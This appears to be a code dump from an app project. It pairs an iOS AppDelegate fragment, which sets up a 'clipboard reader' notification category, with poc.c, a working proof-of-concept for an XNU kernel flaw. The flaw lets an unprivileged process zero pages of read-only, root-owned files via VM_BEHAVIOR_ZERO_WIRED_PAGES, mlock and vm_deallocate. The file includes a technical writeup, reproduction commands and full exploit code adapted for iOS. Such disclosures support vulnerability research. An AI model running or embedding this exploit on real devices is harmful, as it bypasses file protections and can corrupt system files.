    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
        if UserDefaults.standard.bool(forKey: "enableLocationServices") {
            ApplicationMonitor.shared.start()
            self.registerForNotifications()
        }
        return true
    }
    
    func applicationWillTerminate(_ application: UIApplication) {
    }
    
    func applicationDidReceiveMemoryWarning(_ application: UIApplication) {
    }
}

extension AppDelegate: UNUserNotificationCenterDelegate {
    private func registerForNotifications() {
        let category = UNNotificationCategory(identifier: UNNotificationCategory.clipboardReaderIdentifier, actions: [], intentIdentifiers: [])
        UNUserNotificationCenter.current().setNotificationCategories([category])
        
        UNUserNotificationCenter.current().delegate = self
        UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .badge, .sound]) { (success, error) in }
    }
    
    func userNotificationCenter(_ center: UNUserNotificationCenter, willPresent notification: UNNotification, withCompletionHandler completionHandler: @escaping (UNNotificationPresentationOptions) -> Void) {
        completionHandler(.banner)
    }
    
    func userNotificationCenter(_ center: UNUserNotificationCenter, didReceive response: UNNotificationResponse, withCompletionHandler completionHandler: @escaping () -> Void) {
        guard response.notification.request.content.categoryIdentifier == UNNotificationCategory.clipboardReaderIdentifier else { return }
        guard response.actionIdentifier == UNNotificationDefaultActionIdentifier else { return }
    }
}

```

`mdc0/poc.c`:

```c
#if 0
XNU VM_BEHAVIOR_ZERO_WIRED_PAGES behavior allows writing to read-only pages

% python3 -c "print('A'*0x8000)" > AAAAs.txt
% chmod a-w AAAAs.txt 
% sudo chown root:wheel AAAAs.txt 

// file is read-only, owned by root and full of A's

% clang -o unwire_mlock_poc unwire_mlock_poc.c
% ./unwire_mlock_poc AAAAs.txt

// file is still read-only, owned by root, but now has some zeros :)

writeup:

VMEs define the privileges which a particular map has over particular regions of a vm_object.
(See the previous XNU vm issues I reported a few years ago plus my offensivecon 2023 presentation
for more details about that.)

The vm_behavior VM_BEHAVIOR_ZERO_WIRED_PAGES can be set by a task on any vm_entry in its map;
there are no permission checks. It causes the entry->zero_wired_pages flag to be set.

In vm_map_delete, if an entry with a non-zero wired_count is being removed from a map it gets passed to
vm_fault_unwire which looks up the page from the underlying object (using VM_PROT_NONE)

				result = vm_fault_page(
					object,
					(VME_OFFSET(entry) +
					(va - entry->vme_start)),
					VM_PROT_NONE, TRUE,
					FALSE, /* page not looked up */
					&prot, &result_page, &top_page,
					(int *)0,
					NULL, map->no_zero_fill,
					&fault_info);

and then, if zero_wired_pages is set in the entry, passes the page to pmap_zero_page:

				if (entry->zero_wired_pages) {
					pmap_zero_page(VM_PAGE_GET_PHYS_PAGE(result_page));
					entry->zero_wired_pages = FALSE;
				}

At no point either when the flag is set or when the page is zero'd are the permissions checked
or the object semantics respected - the underlying page is just zero'd at the pmap layer.

The one challenge is that you do actually need to get the page wired, and the page has to be something
interesting that's worth being able to write to.

The first observation is that it is possible and supported to wire a page only for reading; i.e. such that
reading from that page won't fault, but writing might. That means it's fine to try to wire read-only pages.

The second observation is that you can't wire pages from objects with symmetric copy semantics - this is
enforced in vm_map_wire_nested which implements the actual semantics. Symmetric objects get converted to
delay copy here, so you can't use this issue to invisibly write to symmetric copy-on-write memory.

But there are still delay copy objects which are interesting , the most obvious being the vnode pager
(i.e. files and their UBC pages.)

Directly calling mach_vm_wire requires the host_priv port (you need to be root) but mlock is unprivileged
and wraps a call to mach_vm_wire_kernel.

So putting it all together, you can open a read-only, root-owned file, mmap an interesting page of it, mark
that vm_entry as VM_BEHAVIOR_ZERO_WIRED_PAGES, mlock the page then mach_vm_deallocate the page and the
underlying UBC page backing that region in the file will get zero'd out directly at the pmap layer!

I'm pretty sure you'd be able to do something interesting with this primitive but yeah, currently an exercise for the reader ;)

PoC only tested on MacOS 15.2 (24C101) on MacBook Pro 13-inch 2019 (Intel, the one I use as a kernel debugging target)
#endif

#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>
#include <mach/mach.h>
// Removed mach_vm.h as it's unsupported in iOS

void* map_file_page_ro(char* path) {
  int fd = open(path, O_RDONLY);

  if (fd == -1) {
    printf("open failed\n");
    exit(EXIT_FAILURE);
  }

  void* mapped_at = mmap(0, PAGE_SIZE, PROT_READ, MAP_FILE | MAP_SHARED, fd, 0);

  if (mapped_at == MAP_FAILED) {
    printf("mmap failed\n");
    exit(EXIT_FAILURE);  
  }

  return mapped_at;
}

int poc(char *path) {
  kern_return_t kr;

  
  void* page = map_file_page_ro(path);

  printf("mapped file at 0x%016llx\n", (uint64_t)page);

  kr = vm_behavior_set(mach_task_self(),
                            (vm_address_t)page,
                            PAGE_SIZE,
                            VM_BEHAVIOR_ZERO_WIRED_PAGES);

  if (kr != KERN_SUCCESS) {
    printf("failed to set VM_BEHAVIOR_ZERO_WIRED_PAGES on the entry\n");
    exit(EXIT_FAILURE);
  }

  printf("set VM_BEHAVIOR_ZERO_WIRED_PAGES\n");
 
  // wire the memory
  // unlike mach_vm_wire, mlock doesn't require root 
  int mlock_err = mlock(page, PAGE_SIZE);
  if (mlock_err != 0) {
    perror("mlock failed\n");
    exit(EXIT_FAILURE);
  }
  printf("mlock success\n");

  kr = vm_deallocate(mach_task_self(),
                          (vm_address_t)page,
                          PAGE_SIZE);
  if (kr != KERN_SUCCESS) {
    printf("vm_deallocate failed: %s\n", mach_error_string(kr));
    exit(EXIT_FAILURE);
  }
  printf("deleted map entries before unwiring\n");

  return 0;
}

```